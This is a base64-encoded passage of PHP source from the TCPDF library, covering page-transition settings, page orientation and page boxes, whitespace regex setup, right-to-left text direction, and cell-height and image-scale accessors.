saXR0ZXInLCAnUicsICdGbHknLCAnUHVzaCcsICdDb3ZlcicsICdVbmNvdmVyJywgJ0ZhZGUnKTsKCQkJCWlmIChpc3NldCgkZm9ybWF0Wyd0cmFucyddWydTJ10pIEFORCBpbl9hcnJheSgkZm9ybWF0Wyd0cmFucyddWydTJ10sICRzdGFuc2l0aW9uX3N0eWxlcykpIHsKCQkJCQkvLyBUaGUgdHJhbnNpdGlvbiBzdHlsZSB0aGF0IHNoYWxsIGJlIHVzZWQgd2hlbiBtb3ZpbmcgdG8gdGhpcyBwYWdlIGZyb20gYW5vdGhlciBkdXJpbmcgYSBwcmVzZW50YXRpb24KCQkJCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3RyYW5zJ11bJ1MnXSA9ICRmb3JtYXRbJ3RyYW5zJ11bJ1MnXTsKCQkJCQkkdmFsaWRfZWZmZWN0ID0gYXJyYXkoJ1NwbGl0JywgJ0JsaW5kcycpOwoJCQkJCSR2YWxpZF92YWxzID0gYXJyYXkoJ0gnLCAnVicpOwoJCQkJCWlmIChpc3NldCgkZm9ybWF0Wyd0cmFucyddWydEbSddKSBBTkQgaW5fYXJyYXkoJGZvcm1hdFsndHJhbnMnXVsnUyddLCAkdmFsaWRfZWZmZWN0KSBBTkQgaW5fYXJyYXkoJGZvcm1hdFsndHJhbnMnXVsnRG0nXSwgJHZhbGlkX3ZhbHMpKSB7CgkJCQkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndHJhbnMnXVsnRG0nXSA9ICRmb3JtYXRbJ3RyYW5zJ11bJ0RtJ107CgkJCQkJfQoJCQkJCSR2YWxpZF9lZmZlY3QgPSBhcnJheSgnU3BsaXQnLCAnQm94JywgJ0ZseScpOwoJCQkJCSR2YWxpZF92YWxzID0gYXJyYXkoJ0knLCAnTycpOwoJCQkJCWlmIChpc3NldCgkZm9ybWF0Wyd0cmFucyddWydNJ10pIEFORCBpbl9hcnJheSgkZm9ybWF0Wyd0cmFucyddWydTJ10sICR2YWxpZF9lZmZlY3QpIEFORCBpbl9hcnJheSgkZm9ybWF0Wyd0cmFucyddWydNJ10sICR2YWxpZF92YWxzKSkgewoJCQkJCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3RyYW5zJ11bJ00nXSA9ICRmb3JtYXRbJ3RyYW5zJ11bJ00nXTsKCQkJCQl9CgkJCQkJJHZhbGlkX2VmZmVjdCA9IGFycmF5KCdXaXBlJywgJ0dsaXR0ZXInLCAnRmx5JywgJ0NvdmVyJywgJ1VuY292ZXInLCAnUHVzaCcpOwoJCQkJCWlmIChpc3NldCgkZm9ybWF0Wyd0cmFucyddWydEaSddKSBBTkQgaW5fYXJyYXkoJGZvcm1hdFsndHJhbnMnXVsnUyddLCAkdmFsaWRfZWZmZWN0KSkgewoJCQkJCQlpZiAoKCgoJGZvcm1hdFsndHJhbnMnXVsnRGknXSA9PSA5MCkgT1IgKCRmb3JtYXRbJ3RyYW5zJ11bJ0RpJ10gPT0gMTgwKSkgQU5EICgkZm9ybWF0Wyd0cmFucyddWydTJ10gPT0gJ1dpcGUnKSkKCQkJCQkJCU9SICgoJGZvcm1hdFsndHJhbnMnXVsnRGknXSA9PSAzMTUpIEFORCAoJGZvcm1hdFsndHJhbnMnXVsnUyddID09ICdHbGl0dGVyJykpCgkJCQkJCQlPUiAoKCRmb3JtYXRbJ3RyYW5zJ11bJ0RpJ10gPT0gMCkgT1IgKCRmb3JtYXRbJ3RyYW5zJ11bJ0RpJ10gPT0gMjcwKSkpIHsKCQkJCQkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndHJhbnMnXVsnRGknXSA9IGludHZhbCgkZm9ybWF0Wyd0cmFucyddWydEaSddKTsKCQkJCQkJfQoJCQkJCX0KCQkJCQlpZiAoaXNzZXQoJGZvcm1hdFsndHJhbnMnXVsnU1MnXSkgQU5EICgkZm9ybWF0Wyd0cmFucyddWydTJ10gPT0gJ0ZseScpKSB7CgkJCQkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndHJhbnMnXVsnU1MnXSA9IGZsb2F0dmFsKCRmb3JtYXRbJ3RyYW5zJ11bJ1NTJ10pOwoJCQkJCX0KCQkJCQlpZiAoaXNzZXQoJGZvcm1hdFsndHJhbnMnXVsnQiddKSBBTkQgKCRmb3JtYXRbJ3RyYW5zJ11bJ0InXSA9PT0gdHJ1ZSkgQU5EICgkZm9ybWF0Wyd0cmFucyddWydTJ10gPT0gJ0ZseScpKSB7CgkJCQkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndHJhbnMnXVsnQiddID0gJ3RydWUnOwoJCQkJCX0KCQkJCX0gZWxzZSB7CgkJCQkJJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd0cmFucyddWydTJ10gPSAnUic7CgkJCQl9CgkJCQlpZiAoaXNzZXQoJGZvcm1hdFsndHJhbnMnXVsnRCddKSkgewoJCQkJCS8vIFRoZSBkdXJhdGlvbiBvZiB0aGUgdHJhbnNpdGlvbiBlZmZlY3QsIGluIHNlY29uZHMKCQkJCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3RyYW5zJ11bJ0QnXSA9IGZsb2F0dmFsKCRmb3JtYXRbJ3RyYW5zJ11bJ0QnXSk7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndHJhbnMnXVsnRCddID0gMTsKCQkJCX0KCQkJfQoJCX0KCQkkdGhpcy0+c2V0UGFnZU9yaWVudGF0aW9uKCRvcmllbnRhdGlvbik7Cgl9CgoJLyoqCgkgKiBTZXQgcGFnZSBvcmllbnRhdGlvbi4KCSAqIEBwYXJhbSBzdHJpbmcgJG9yaWVudGF0aW9uIHBhZ2Ugb3JpZW50YXRpb24uIFBvc3NpYmxlIHZhbHVlcyBhcmUgKGNhc2UgaW5zZW5zaXRpdmUpOjx1bD48bGk+UCBvciBQb3J0cmFpdCAoZGVmYXVsdCk8L2xpPjxsaT5MIG9yIExhbmRzY2FwZTwvbGk+PGxpPicnIChlbXB0eSBzdHJpbmcpIGZvciBhdXRvbWF0aWMgb3JpZW50YXRpb248L2xpPjwvdWw+CgkgKiBAcGFyYW0gYm9vbGVhbnxudWxsICRhdXRvcGFnZWJyZWFrIEJvb2xlYW4gaW5kaWNhdGluZyBpZiBhdXRvLXBhZ2UtYnJlYWsgbW9kZSBzaG91bGQgYmUgb24gb3Igb2ZmLgoJICogQHBhcmFtIGZsb2F0fG51bGwgJGJvdHRvbW1hcmdpbiBib3R0b20gbWFyZ2luIG9mIHRoZSBwYWdlLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDMuMC4wMTUgKDIwMDgtMDYtMDYpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRQYWdlT3JpZW50YXRpb24oJG9yaWVudGF0aW9uLCAkYXV0b3BhZ2VicmVhaz1udWxsLCAkYm90dG9tbWFyZ2luPW51bGwpIHsKCQlpZiAoIWlzc2V0KCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnTWVkaWFCb3gnXSkpIHsKCQkJLy8gdGhlIGJvdW5kYXJpZXMgb2YgdGhlIHBoeXNpY2FsIG1lZGl1bSBvbiB3aGljaCB0aGUgcGFnZSBzaGFsbCBiZSBkaXNwbGF5ZWQgb3IgcHJpbnRlZAoJCQkkdGhpcy0+cGFnZWRpbSA9IFRDUERGX1NUQVRJQzo6c2V0UGFnZUJveGVzKCR0aGlzLT5wYWdlLCAnTWVkaWFCb3gnLCAwLCAwLCAkdGhpcy0+ZndQdCwgJHRoaXMtPmZoUHQsIHRydWUsICR0aGlzLT5rLCAkdGhpcy0+cGFnZWRpbSk7CgkJfQoJCWlmICghaXNzZXQoJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydDcm9wQm94J10pKSB7CgkJCS8vIHRoZSB2aXNpYmxlIHJlZ2lvbiBvZiBkZWZhdWx0IHVzZXIgc3BhY2UKCQkJJHRoaXMtPnBhZ2VkaW0gPSBUQ1BERl9TVEFUSUM6OnNldFBhZ2VCb3hlcygkdGhpcy0+cGFnZSwgJ0Nyb3BCb3gnLCAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ01lZGlhQm94J11bJ2xseCddLCAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ01lZGlhQm94J11bJ2xseSddLCAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ01lZGlhQm94J11bJ3VyeCddLCAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ01lZGlhQm94J11bJ3VyeSddLCB0cnVlLCAkdGhpcy0+aywgJHRoaXMtPnBhZ2VkaW0pOwoJCX0KCQlpZiAoIWlzc2V0KCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQmxlZWRCb3gnXSkpIHsKCQkJLy8gdGhlIHJlZ2lvbiB0byB3aGljaCB0aGUgY29udGVudHMgb2YgdGhlIHBhZ2Ugc2hhbGwgYmUgY2xpcHBlZCB3aGVuIG91dHB1dCBpbiBhIHByb2R1Y3Rpb24gZW52aXJvbm1lbnQKCQkJJHRoaXMtPnBhZ2VkaW0gPSBUQ1BERl9TVEFUSUM6OnNldFBhZ2VCb3hlcygkdGhpcy0+cGFnZSwgJ0JsZWVkQm94JywgJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydDcm9wQm94J11bJ2xseCddLCAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ0Nyb3BCb3gnXVsnbGx5J10sICR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQ3JvcEJveCddWyd1cngnXSwgJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydDcm9wQm94J11bJ3VyeSddLCB0cnVlLCAkdGhpcy0+aywgJHRoaXMtPnBhZ2VkaW0pOwoJCX0KCQlpZiAoIWlzc2V0KCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnVHJpbUJveCddKSkgewoJCQkvLyB0aGUgaW50ZW5kZWQgZGltZW5zaW9ucyBvZiB0aGUgZmluaXNoZWQgcGFnZSBhZnRlciB0cmltbWluZwoJCQkkdGhpcy0+cGFnZWRpbSA9IFRDUERGX1NUQVRJQzo6c2V0UGFnZUJveGVzKCR0aGlzLT5wYWdlLCAnVHJpbUJveCcsICR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQ3JvcEJveCddWydsbHgnXSwgJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydDcm9wQm94J11bJ2xseSddLCAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ0Nyb3BCb3gnXVsndXJ4J10sICR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQ3JvcEJveCddWyd1cnknXSwgdHJ1ZSwgJHRoaXMtPmssICR0aGlzLT5wYWdlZGltKTsKCQl9CgkJaWYgKCFpc3NldCgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ0FydEJveCddKSkgewoJCQkvLyB0aGUgcGFnZSdzIG1lYW5pbmdmdWwgY29udGVudCAoaW5jbHVkaW5nIHBvdGVudGlhbCB3aGl0ZSBzcGFjZSkKCQkJJHRoaXMtPnBhZ2VkaW0gPSBUQ1BERl9TVEFUSUM6OnNldFBhZ2VCb3hlcygkdGhpcy0+cGFnZSwgJ0FydEJveCcsICR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQ3JvcEJveCddWydsbHgnXSwgJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydDcm9wQm94J11bJ2xseSddLCAkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ0Nyb3BCb3gnXVsndXJ4J10sICR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnQ3JvcEJveCddWyd1cnknXSwgdHJ1ZSwgJHRoaXMtPmssICR0aGlzLT5wYWdlZGltKTsKCQl9CgkJaWYgKCFpc3NldCgkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ1JvdGF0ZSddKSkgewoJCQkvLyBUaGUgbnVtYmVyIG9mIGRlZ3JlZXMgYnkgd2hpY2ggdGhlIHBhZ2Ugc2hhbGwgYmUgcm90YXRlZCBjbG9ja3dpc2Ugd2hlbiBkaXNwbGF5ZWQgb3IgcHJpbnRlZC4gVGhlIHZhbHVlIHNoYWxsIGJlIGEgbXVsdGlwbGUgb2YgOTAuCgkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnUm90YXRlJ10gPSAwOwoJCX0KCQlpZiAoIWlzc2V0KCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnUFonXSkpIHsKCQkJLy8gVGhlIHBhZ2UncyBwcmVmZXJyZWQgem9vbSAobWFnbmlmaWNhdGlvbikgZmFjdG9yCgkJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnUFonXSA9IDE7CgkJfQoJCWlmICgkdGhpcy0+ZndQdCA+ICR0aGlzLT5maFB0KSB7CgkJCS8vIGxhbmRzY2FwZQoJCQkkZGVmYXVsdF9vcmllbnRhdGlvbiA9ICdMJzsKCQl9IGVsc2UgewoJCQkvLyBwb3J0cmFpdAoJCQkkZGVmYXVsdF9vcmllbnRhdGlvbiA9ICdQJzsKCQl9CgkJJHZhbGlkX29yaWVudGF0aW9ucyA9IGFycmF5KCdQJywgJ0wnKTsKCQlpZiAoZW1wdHkoJG9yaWVudGF0aW9uKSkgewoJCQkkb3JpZW50YXRpb24gPSAkZGVmYXVsdF9vcmllbnRhdGlvbjsKCQl9IGVsc2UgewoJCQkkb3JpZW50YXRpb24gPSBzdHJ0b3VwcGVyKCRvcmllbnRhdGlvblswXSk7CgkJfQoJCWlmIChpbl9hcnJheSgkb3JpZW50YXRpb24sICR2YWxpZF9vcmllbnRhdGlvbnMpIEFORCAoJG9yaWVudGF0aW9uICE9ICRkZWZhdWx0X29yaWVudGF0aW9uKSkgewoJCQkkdGhpcy0+Q3VyT3JpZW50YXRpb24gPSAkb3JpZW50YXRpb247CgkJCSR0aGlzLT53UHQgPSAkdGhpcy0+ZmhQdDsKCQkJJHRoaXMtPmhQdCA9ICR0aGlzLT5md1B0OwoJCX0gZWxzZSB7CgkJCSR0aGlzLT5DdXJPcmllbnRhdGlvbiA9ICRkZWZhdWx0X29yaWVudGF0aW9uOwoJCQkkdGhpcy0+d1B0ID0gJHRoaXMtPmZ3UHQ7CgkJCSR0aGlzLT5oUHQgPSAkdGhpcy0+ZmhQdDsKCQl9CgkJaWYgKChhYnMoJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydNZWRpYUJveCddWyd1cngnXSAtICR0aGlzLT5oUHQpIDwgJHRoaXMtPmZlcHMpIEFORCAoYWJzKCR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnTWVkaWFCb3gnXVsndXJ5J10gLSAkdGhpcy0+d1B0KSA8ICR0aGlzLT5mZXBzKSl7CgkJCS8vIHN3YXAgWCBhbmQgWSBjb29yZGluYXRlcyAoY2hhbmdlIHBhZ2Ugb3JpZW50YXRpb24pCgkJCSR0aGlzLT5wYWdlZGltID0gVENQREZfU1RBVElDOjpzd2FwUGFnZUJveENvb3JkaW5hdGVzKCR0aGlzLT5wYWdlLCAkdGhpcy0+cGFnZWRpbSk7CgkJfQoJCSR0aGlzLT53ID0gKCR0aGlzLT53UHQgLyAkdGhpcy0+ayk7CgkJJHRoaXMtPmggPSAoJHRoaXMtPmhQdCAvICR0aGlzLT5rKTsKCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGF1dG9wYWdlYnJlYWspKSB7CgkJCWlmIChpc3NldCgkdGhpcy0+QXV0b1BhZ2VCcmVhaykpIHsKCQkJCSRhdXRvcGFnZWJyZWFrID0gJHRoaXMtPkF1dG9QYWdlQnJlYWs7CgkJCX0gZWxzZSB7CgkJCQkkYXV0b3BhZ2VicmVhayA9IHRydWU7CgkJCX0KCQl9CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRib3R0b21tYXJnaW4pKSB7CgkJCWlmIChpc3NldCgkdGhpcy0+Yk1hcmdpbikpIHsKCQkJCSRib3R0b21tYXJnaW4gPSAkdGhpcy0+Yk1hcmdpbjsKCQkJfSBlbHNlIHsKCQkJCS8vIGRlZmF1bHQgdmFsdWUgPSAyIGNtCgkJCQkkYm90dG9tbWFyZ2luID0gMiAqIDI4LjM1IC8gJHRoaXMtPms7CgkJCX0KCQl9CgkJJHRoaXMtPnNldEF1dG9QYWdlQnJlYWsoJGF1dG9wYWdlYnJlYWssICRib3R0b21tYXJnaW4pOwoJCS8vIHN0b3JlIHBhZ2UgZGltZW5zaW9ucwoJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsndyddID0gJHRoaXMtPndQdDsKCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ2gnXSA9ICR0aGlzLT5oUHQ7CgkJJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd3ayddID0gJHRoaXMtPnc7CgkJJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydoayddID0gJHRoaXMtPmg7CgkJJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWyd0bSddID0gJHRoaXMtPnRNYXJnaW47CgkJJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydibSddID0gJGJvdHRvbW1hcmdpbjsKCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ2xtJ10gPSAkdGhpcy0+bE1hcmdpbjsKCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3JtJ10gPSAkdGhpcy0+ck1hcmdpbjsKCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ3BiJ10gPSAkYXV0b3BhZ2VicmVhazsKCQkkdGhpcy0+cGFnZWRpbVskdGhpcy0+cGFnZV1bJ29yJ10gPSAkdGhpcy0+Q3VyT3JpZW50YXRpb247CgkJJHRoaXMtPnBhZ2VkaW1bJHRoaXMtPnBhZ2VdWydvbG0nXSA9ICR0aGlzLT5vcmlnaW5hbF9sTWFyZ2luOwoJCSR0aGlzLT5wYWdlZGltWyR0aGlzLT5wYWdlXVsnb3JtJ10gPSAkdGhpcy0+b3JpZ2luYWxfck1hcmdpbjsKCX0KCgkvKioKCSAqIFNldCByZWd1bGFyIGV4cHJlc3Npb24gdG8gZGV0ZWN0IHdpdGhlc3BhY2VzIG9yIHdvcmQgc2VwYXJhdG9ycy4KCSAqIFRoZSBwYXR0ZXJuIGRlbGltaXRlciBtdXN0IGJlIHRoZSBmb3J3YXJkLXNsYXNoIGNoYXJhY3RlciAiLyIuCgkgKiBTb21lIGV4YW1wbGUgcGF0dGVybnMgYXJlOgoJICogPHByZT4KCSAqIE5vbi1Vbmljb2RlIG9yIG1pc3NpbmcgUENSRSB1bmljb2RlIHN1cHBvcnQ6ICIvW15cU1x4YTBdLyIKCSAqIFVuaWNvZGUgYW5kIFBDUkUgdW5pY29kZSBzdXBwb3J0OiAiLyg/IVx4YTApW1xzXHB7Wn1dL3UiCgkgKiBVbmljb2RlIGFuZCBQQ1JFIHVuaWNvZGUgc3VwcG9ydCBpbiBDaGluZXNlIG1vZGU6ICIvKD8hXHhhMClbXHNccHtafVxwe0xvfV0vdSIKCSAqIGlmIFBDUkUgdW5pY29kZSBzdXBwb3J0IGlzIHR1cm5lZCBPTiAoIlxQIiBpcyB0aGUgbmVnYXRlIGNsYXNzIG9mICJccCIpOgoJICogICAgICBccyAgICAgOiBhbnkgd2hpdGVzcGFjZSBjaGFyYWN0ZXIKCSAqICAgICAgXHB7Wn0gIDogYW55IHNlcGFyYXRvcgoJICogICAgICBccHtMb30gOiBVbmljb2RlIGxldHRlciBvciBpZGVvZ3JhcGggdGhhdCBkb2VzIG5vdCBoYXZlIGxvd2VyY2FzZSBhbmQgdXBwZXJjYXNlIHZhcmlhbnRzLiBJcyB1c2VkIHRvIGNodW5rIGNoaW5lc2Ugd29yZHMuCgkgKiAgICAgIFx4YTAgICA6IFVuaWNvZGUgQ2hhcmFjdGVyICdOTy1CUkVBSyBTUEFDRScgKFUrMDBBMCkKCSAqIDwvcHJlPgoJICogQHBhcmFtIHN0cmluZyAkcmUgcmVndWxhciBleHByZXNzaW9uIChsZWF2ZSBlbXB0eSBmb3IgZGVmYXVsdCkuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC42LjAxNiAoMjAwOS0wNi0xNSkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFNwYWNlc1JFKCRyZT0nL1teXFNceGEwXS8nKSB7CgkJJHRoaXMtPnJlX3NwYWNlcyA9ICRyZTsKCQkkcmVfcGFydHMgPSBleHBsb2RlKCcvJywgJHJlKTsKCQkvLyBnZXQgcGF0dGVybiBwYXJ0cwoJCSR0aGlzLT5yZV9zcGFjZSA9IGFycmF5KCk7CgkJaWYgKGlzc2V0KCRyZV9wYXJ0c1sxXSkgQU5EICFlbXB0eSgkcmVfcGFydHNbMV0pKSB7CgkJCSR0aGlzLT5yZV9zcGFjZVsncCddID0gJHJlX3BhcnRzWzFdOwoJCX0gZWxzZSB7CgkJCSR0aGlzLT5yZV9zcGFjZVsncCddID0gJ1tcc10nOwoJCX0KCQkvLyBzZXQgcGF0dGVybiBtb2RpZmllcnMKCQlpZiAoaXNzZXQoJHJlX3BhcnRzWzJdKSBBTkQgIWVtcHR5KCRyZV9wYXJ0c1syXSkpIHsKCQkJJHRoaXMtPnJlX3NwYWNlWydtJ10gPSAkcmVfcGFydHNbMl07CgkJfSBlbHNlIHsKCQkJJHRoaXMtPnJlX3NwYWNlWydtJ10gPSAnJzsKCQl9Cgl9CgoJLyoqCgkgKiBFbmFibGUgb3IgZGlzYWJsZSBSaWdodC1Uby1MZWZ0IGxhbmd1YWdlIG1vZGUKCSAqIEBwYXJhbSBib29sZWFuICRlbmFibGUgaWYgdHJ1ZSBlbmFibGUgUmlnaHQtVG8tTGVmdCBsYW5ndWFnZSBtb2RlLgoJICogQHBhcmFtIGJvb2xlYW4gJHJlc2V0eCBpZiB0cnVlIHJlc2V0IHRoZSBYIHBvc2l0aW9uIG9uIGRpcmVjdGlvbiBjaGFuZ2UuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4wLjAwMCAoMjAwOC0wMS0wMykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFJUTCgkZW5hYmxlLCAkcmVzZXR4PXRydWUpIHsKCQkkZW5hYmxlID0gJGVuYWJsZSA/IHRydWUgOiBmYWxzZTsKCQkkcmVzZXR4ID0gKCRyZXNldHggQU5EICgkZW5hYmxlICE9ICR0aGlzLT5ydGwpKTsKCQkkdGhpcy0+cnRsID0gJGVuYWJsZTsKCQkkdGhpcy0+dG1wcnRsID0gZmFsc2U7CgkJaWYgKCRyZXNldHgpIHsKCQkJJHRoaXMtPkxuKDApOwoJCX0KCX0KCgkvKioKCSAqIFJldHVybiB0aGUgUlRMIHN0YXR1cwoJICogQHJldHVybiBib29sCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4wLjAxMiAoMjAwOC0wNy0yNCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldFJUTCgpIHsKCQlyZXR1cm4gJHRoaXMtPnJ0bDsKCX0KCgkvKioKCSAqIEZvcmNlIHRlbXBvcmFyeSBSVEwgbGFuZ3VhZ2UgZGlyZWN0aW9uCgkgKiBAcGFyYW0gZmFsc2V8c3RyaW5nICRtb2RlIGNhbiBiZSBmYWxzZSwgJ0wnIGZvciBMVFIgb3IgJ1InIGZvciBSVEwKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAyLjEuMDAwICgyMDA4LTAxLTA5KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0VGVtcFJUTCgkbW9kZSkgewoJCSRuZXdtb2RlID0gZmFsc2U7CgkJc3dpdGNoIChzdHJ0b3VwcGVyKCRtb2RlKSkgewoJCQljYXNlICdMVFInOgoJCQljYXNlICdMJzogewoJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkkbmV3bW9kZSA9ICdMJzsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ1JUTCc6CgkJCWNhc2UgJ1InOiB7CgkJCQlpZiAoISR0aGlzLT5ydGwpIHsKCQkJCQkkbmV3bW9kZSA9ICdSJzsKCQkJCX0KCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgZmFsc2U6CgkJCWRlZmF1bHQ6IHsKCQkJCSRuZXdtb2RlID0gZmFsc2U7CgkJCQlicmVhazsKCQkJfQoJCX0KCQkkdGhpcy0+dG1wcnRsID0gJG5ld21vZGU7Cgl9CgoJLyoqCgkgKiBSZXR1cm4gdGhlIGN1cnJlbnQgdGVtcG9yYXJ5IFJUTCBzdGF0dXMKCSAqIEByZXR1cm4gYm9vbAoJICogQHB1YmxpYwoJICogQHNpbmNlIDQuOC4wMTQgKDIwMDktMTEtMDQpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBpc1JUTFRleHREaXIoKSB7CgkJcmV0dXJuICgkdGhpcy0+cnRsIE9SICgkdGhpcy0+dG1wcnRsID09ICdSJykpOwoJfQoKCS8qKgoJICogU2V0IHRoZSBsYXN0IGNlbGwgaGVpZ2h0LgoJICogQHBhcmFtIGZsb2F0ICRoIGNlbGwgaGVpZ2h0LgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjUzLjAuVEMwMzQKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldExhc3RIKCRoKSB7CgkJJHRoaXMtPmxhc3RoID0gJGg7Cgl9CgoJLyoqCgkgKiBSZXR1cm4gdGhlIGNlbGwgaGVpZ2h0CgkgKiBAcGFyYW0gaW50ICRmb250c2l6ZSBGb250IHNpemUgaW4gaW50ZXJuYWwgdW5pdHMKCSAqIEBwYXJhbSBib29sZWFuICRwYWRkaW5nIElmIHRydWUgYWRkIGNlbGwgcGFkZGluZwoJICogQHB1YmxpYwoJICogQHJldHVybiBmbG9hdAoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Q2VsbEhlaWdodCgkZm9udHNpemUsICRwYWRkaW5nPVRSVUUpIHsKCQkkaGVpZ2h0ID0gKCRmb250c2l6ZSAqICR0aGlzLT5jZWxsX2hlaWdodF9yYXRpbyk7CgkJaWYgKCRwYWRkaW5nICYmICFlbXB0eSgkdGhpcy0+Y2VsbF9wYWRkaW5nKSkgewoJCQkkaGVpZ2h0ICs9ICgkdGhpcy0+Y2VsbF9wYWRkaW5nWydUJ10gKyAkdGhpcy0+Y2VsbF9wYWRkaW5nWydCJ10pOwoJCX0KCQlyZXR1cm4gcm91bmQoJGhlaWdodCwgNik7Cgl9CgoJLyoqCgkgKiBSZXNldCB0aGUgbGFzdCBjZWxsIGhlaWdodC4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMDAwICgyMDEwLTEwLTAzKQoJICovCglwdWJsaWMgZnVuY3Rpb24gcmVzZXRMYXN0SCgpIHsKCQkkdGhpcy0+bGFzdGggPSAkdGhpcy0+Z2V0Q2VsbEhlaWdodCgkdGhpcy0+Rm9udFNpemUpOwoJfQoKCS8qKgoJICogR2V0IHRoZSBsYXN0IGNlbGwgaGVpZ2h0LgoJICogQHJldHVybiBmbG9hdCBsYXN0IGNlbGwgaGVpZ2h0CgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4wLjAxNyAoMjAwOC0wOC0wNSkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldExhc3RIKCkgewoJCXJldHVybiAkdGhpcy0+bGFzdGg7Cgl9CgoJLyoqCgkgKiBTZXQgdGhlIGFkanVzdGluZyBmYWN0b3IgdG8gY29udmVydCBwaXhlbHMgdG8gdXNlciB1bml0cy4KCSAqIEBwYXJhbSBmbG9hdCAkc2NhbGUgYWRqdXN0aW5nIGZhY3RvciB0byBjb252ZXJ0IHBpeGVscyB0byB1c2VyIHVuaXRzLgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjUuMgoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0SW1hZ2VTY2FsZSgkc2NhbGUpIHsKCQkkdGhpcy0+aW1nc2NhbGUgPSAkc2NhbGU7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBhZGp1c3RpbmcgZmFjdG9yIHRvIGNvbnZlcnQgcGl4ZWxzIHRvIHVzZXIgdW5pdHMuCgkgKiBAcmV0dXJuIGZsb2F0IGFkanVzdGluZyBmYWN0b3IgdG8gY29udmVydCBwaXhlbHMgdG8gdXNlciB1bml0cy4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMS41LjIKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEltYWdlU2NhbGUoKSB7CgkJcmV0dXJuICR0aGlzLT5pbWdzY2FsZTsKCX0KCgkvKioKCSAqIFJldHVybnMgYW4gYXJyYXkgb2YgcGFnZSBkaW1lbnNpb25zOgoJICogPHVsPjxsaT4kdGhpcy0+cGFnZWRpbVskdGhp